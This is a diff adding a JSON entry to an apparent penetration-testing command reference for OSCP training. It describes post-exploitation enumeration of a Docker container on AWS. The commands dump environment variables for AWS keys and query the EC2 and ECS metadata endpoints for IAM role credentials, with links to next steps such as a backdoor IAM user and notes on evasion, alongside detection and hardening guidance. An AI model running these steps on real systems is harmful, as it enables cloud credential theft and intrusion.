@@ -1,0 +1,130 @@
+{
+  "id": "aws-container-enum",
+  "name": "AWS - Docker Container Post-Exploitation Enumeration",
+  "command": "cat /proc/mounts | grep overlay\ncat /proc/1/status | grep Cap\ncapsh --decode=<hex_value>\nenv | grep -i aws\nprintenv\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+  "description": "After getting a shell inside a container (e.g., via Jenkins pipeline RCE or supply-chain attack), enumerate the container environment to: (1) confirm container context via /proc/mounts overlay filesystem, (2) check Linux capabilities via /proc/1/status CapEff field \u2014 high capabilities (cap_sys_admin) may allow container escape, (3) dump environment variables for embedded AWS credentials \u2014 CI/CD containers routinely inject cloud credentials via env vars, (4) query EC2 Instance Metadata Service (IMDS) if running on EC2 for the attached IAM role credentials.",
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "shell-in-container"
+  ],
+  "tools": [
+    "bash",
+    "curl",
+    "capsh"
+  ],
+  "tags": [
+    "docker",
+    "container",
+    "aws",
+    "cloud",
+    "post-exploitation",
+    "credentials",
+    "enumeration"
+  ],
+  "category": "Credential Access",
+  "subcategory": "Cloud - AWS",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 25: Attacking AWS Cloud Infrastructure (25.5.3)",
+  "examples": [
+    {
+      "label": "Confirm you are inside a Docker container",
+      "command": "cat /proc/mounts | grep overlay\n# overlay on / type overlay -> Docker container confirmed\n# Also check: ls /.dockerenv (file exists in Docker containers)"
+    },
+    {
+      "label": "Check effective Linux capabilities of PID 1",
+      "command": "cat /proc/1/status | grep Cap\n# CapInh: 0000000000000000\n# CapPrm: 00000000a80425fb\n# CapEff: 00000000a80425fb  <- this is the key value"
+    },
+    {
+      "label": "Decode capability hex to readable list",
+      "command": "capsh --decode=00000000a80425fb\n# 0x00000000a80425fb=cap_chown,cap_dac_override,...,cap_net_raw,...\n# cap_sys_admin present -> possible container escape"
+    },
+    {
+      "label": "Dump all environment variables (look for cloud credentials)",
+      "command": "printenv\n# Or: env\n# Or: cat /proc/1/environ | tr '\\0' '\\n'"
+    },
+    {
+      "label": "Filter specifically for AWS credential env vars",
+      "command": "env | grep -i aws\n# AWS_ACCESS_KEY_ID=AKIA...\n# AWS_SECRET_ACCESS_KEY=...\n# AWS_DEFAULT_REGION=us-east-1\n# AWS_CONTAINER_CREDENTIALS_RELATIVE_URI (ECS task role)"
+    },
+    {
+      "label": "Query EC2 Instance Metadata Service for role name",
+      "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# Returns role name if container runs on EC2 with instance profile attached"
+    },
+    {
+      "label": "Get temporary credentials from EC2 instance profile",
+      "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>\n# Returns: AccessKeyId, SecretAccessKey, Token, Expiration"
+    },
+    {
+      "label": "Query ECS task role credentials (different IMDS endpoint)",
+      "command": "curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\n# Returns: AccessKeyId, SecretAccessKey, Token for ECS task role"
+    },
+    {
+      "label": "Check network interfaces (container networks for lateral movement)",
+      "command": "ip addr\n# Or: ifconfig\n# Multiple interfaces (eth0 + eth1) indicate container is on multiple Docker networks"
+    },
+    {
+      "label": "Enumerate container's internal DNS / hosts file",
+      "command": "cat /etc/hosts\ncat /etc/resolv.conf\n# Internal hostnames reveal other containers/services on the same network"
+    }
+  ],
+  "notes": "Docker containers without '--cap-drop ALL' retain many default Linux capabilities. The hex value in CapEff is a bitmask \u2014 'capsh --decode' translates it to named capabilities. cap_sys_admin is the most dangerous (allows mounting filesystems, potentially escaping). Even without privilege escalation, environment variables are the primary credential leak vector in cloud CI/CD environments: Jenkins, GitHub Actions, GitLab CI, CircleCI, AWS CodeBuild all inject credentials this way. The IMDS endpoint 169.254.169.254 is only reachable from instances, not from the public internet \u2014 reaching it from inside a container confirms cloud-hosted environment and may yield the attached IAM role. IMDSv2 requires a token: TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Attacking AWS Cloud Infrastructure",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "MITRE ATT&CK - Steal Application Access Token",
+      "url": "https://attack.mitre.org/techniques/T1528/"
+    },
+    {
+      "title": "MITRE ATT&CK - Container and Resource Discovery",
+      "url": "https://attack.mitre.org/techniques/T1613/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "aws-jenkins-pipeline-rce",
+      "rel": "prereq",
+      "note": "Get container shell via Jenkins pipeline modification first."
+    },
+    {
+      "id": "aws-iam-privesc-backdoor",
+      "rel": "next",
+      "note": "Use discovered AWS credentials to create a persistent backdoor IAM user."
+    },
+    {
+      "id": "aws-iam-scope-permissions",
+      "rel": "next",
+      "note": "Scope permissions of stolen credentials before escalating."
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1528",
+    "T1613",
+    "T1552.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "AWS container services (ECS, EKS, ECR) are frequently misconfigured: ECR repositories may allow public pulls, ECS task IAM roles are often over-permissioned, and EKS clusters may have unauthenticated API access. Enumerating ECR for exposed container images reveals application code and hardcoded secrets. ECS task metadata endpoint (169.254.170.2) provides temporary IAM role credentials from within a container. EKS with anonymous auth enabled exposes cluster APIs without credentials.",
+    "prerequisites": "AWS credentials with ecs:ListClusters, ecr:ListRepositories permissions, or access from within a container (IMDS access). AWS CLI or kubectl for EKS. Network access to container metadata endpoint (from within container).",
+    "impact": "T1528 Steal Application Access Token + T1613 Container and Resource Discovery + T1552.001 Credentials In Files. Maps container infrastructure, extracts container images for secret analysis, and obtains IAM credentials via container metadata endpoint. Frequently leads to IAM privilege escalation via over-permissioned task roles.",
+    "detection": "CloudTrail: ecr:GetDownloadUrlForLayer, ecr:BatchGetImage from external IPs. ecr:DescribeRepositories enumeration. EKS API server audit logs: API calls with system:anonymous user (if anonymous auth enabled). CloudTrail: ecs:ListTasks, ecs:DescribeTasks for reconnaissance.\nMonitor container service account token access followed by unauthorized Kubernetes API requests (AN1423). Detect token retrieval from IMDS (AWS/Azure) followed by API usage from non-standard apps (AN1424). Flag unusual OAuth app registration + user-granted token + high-privilege resource access (AN1425). Monitor OAuth tokens granting mail/calendar/SharePoint access granted recently or via spearphishing (AN1426). Detect programmatic access via stolen tokens in Slack, GitHub, Google Workspace from new IPs or apps (AN1427) (DET0515).",
+    "artifacts": "CloudTrail: ECR image pull from unexpected IP | CloudTrail: ECS enumeration API calls | EKS audit log: anonymous API access | Container: IMDS query for task IAM credentials (visible in ECS task logs if logging enabled)",
+    "prevention": "ECR: disable public access, require private pull with authentication. ECR image scanning (AWS Inspector): detect secrets and vulnerabilities in images before deployment. EKS: disable anonymous auth (--anonymous-auth=false on kube-apiserver). ECS task roles: least-privilege, use IAM conditions to restrict to specific VPC. Secrets in images: scan with truffleHog or git-secrets in CI/CD before push.\nAudit: Audit cloud/container accounts, permissions, and OAuth app grants. Investigate suspicious apps.\nRestrict Web-Based Content: Block end-user OAuth app consent; force admin approval. Use CASB to ban apps. Disable user ability to register new Azure AD applications.\nUser Account Management: Enforce RBAC/least privilege. Use CASB for cloud app policies. In Kubernetes, set automountServiceAccountToken: false for pods not requiring service account tokens.\nUser Training: Train users to reject unrecognized OAuth apps; scrutinize redirect URLs and requested permissions (offline access, email read).",
+    "evasion": "From within a container: access metadata endpoint (169.254.170.2) for free credentials \u2014 no authentication needed, logged as task role not as external access. Access ECR images via container layer pulls rather than full image pull.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1528/",
+      "https://attack.mitre.org/techniques/T1613/",
+      "https://attack.mitre.org/techniques/T1552/001/"
+    ],
+    "misconfiguration": "ECR repositories public or accessible to all account roles. ECS task roles over-permissioned (admin-level). EKS with anonymous auth enabled. No ECR image scanning. Secrets hardcoded in container images.",
+    "vulnerable_config": "# Over-permissioned ECS task role:\naws iam get-role-policy --role-name ecs-task-role --policy-name task-policy\n# \u2192 Action: '*', Resource: '*' (admin role on ECS task)\n\n# ECS task metadata credentials (from within container):\ncurl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\n# \u2192 AccessKeyId: ASIA..., SecretAccessKey: ..., Token: ... (temporary creds)\n# \u2192 These creds have the ECS task role permissions = admin if misconfigured",
+    "secure_config": "# Least-privilege ECS task roles:\n# Only grant permissions the container actually needs:\n# Application reads from S3? Only: s3:GetObject on specific bucket\n# Application writes to DynamoDB? Only: dynamodb:PutItem on specific table\n\n# ECR private with scanning:\naws ecr put-image-scanning-configuration --repository-name myapp --image-scanning-configuration scanOnPush=true\n\n# EKS: disable anonymous auth:\n# kube-apiserver flag: --anonymous-auth=false\n# Or use EKS managed addon with aws-auth ConfigMap\n\n# Secrets in containers: use Secrets Manager:\n# AWS Secrets Manager + ECS: inject via environment variable at task launch\n# EKS: use AWS Secrets Store CSI Driver"
+  }
+}
